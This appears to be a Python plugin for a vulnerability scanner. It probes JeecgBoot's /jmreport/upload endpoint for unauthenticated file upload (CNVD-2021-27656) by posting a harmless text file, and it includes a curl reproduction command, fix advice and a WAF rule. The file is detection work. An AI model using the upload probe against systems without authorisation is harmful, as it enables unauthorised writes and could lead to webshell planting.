# JeecgBoot 任意文件上传：/jmreport/upload 未授权上传（存在性验证，不落地恶意文件）
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_all
from plugins.base import PluginBase


class JeecgFileUploadJmreportPlugin(PluginBase):
    name = "JeecgBoot jmreport 文件上传"
    cve = "CNVD-2021-27656"
    severity = "high"
    category = "vuln"
    description = "JeecgBoot 报表模块 /jmreport/upload 存在未授权任意文件上传"
    fix = "升级 JeecgBoot 至 3.4.2+；报表接口强制鉴权"
    fix_detail = (
        "【升级方案】升级至 JeecgBoot 3.4.2+（报表上传安全修复）\n"
        "【配置加固】/jmreport/** 强制鉴权（当前默认未授权）\n"
        "【WAF 规则】拦截 /jmreport/upload POST multipart 请求\n"
        "【合规】OWASP A04:2021 不安全设计；等保 2.0 8.1.4"
    )
    reproduce = (
        'curl -X POST "http://target/jeecg-boot/jmreport/upload" \\\n'
        '  -F "file=@test.txt;filename=test.txt" \\\n'
        '  -F "biz=test"\n'
        "# 预期响应：JSON 含 url/fileName 字段（上传成功路径回显）"
    )
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.4;OWASP:A04:2021"
    vuln_type = "file_upload"
    supports_waf_bypass = False

    def verify(self, target, session):
        url = join_url(target, "/jeecg-boot/jmreport/upload")
        # multipart 探针（上传无害 txt，仅验证接口可写）
        boundary = "----ruoyi-scan-probe"
        body = (
            "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"ruoyi_scan_probe.txt\"\r\n"
            "Content-Type: text/plain\r\n\r\nruoyi-scan-probe\r\n"
            "--%s\r\nContent-Disposition: form-data; name=\"biz\"\r\n\r\ntest\r\n"
            "--%s--\r\n" % (boundary, boundary, boundary)
        )
        try:
            resp = session.post(
                url,
                data=body,
                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary},
            )
            text = resp.text or ""
        except Exception as e:
            print(no("JeecgBoot jmreport 文件上传（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        if resp.status_code == 200 and match_all(text, ["url", "fileName"]):
            print(ok("存在 JeecgBoot jmreport 文件上传"))
            return ScanResult(
                kind="vuln", name=self.name, severity=self.severity, status=STATUS_CONFIRMED,
                url=url, evidence="上传接口返回 url/fileName（可写）",
                fix=self.fix, extra={"vuln_type": "file_upload", "plugin_name": "jeecg_upload_jmreport"},
            )
        print(no("不存在 JeecgBoot jmreport 文件上传"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
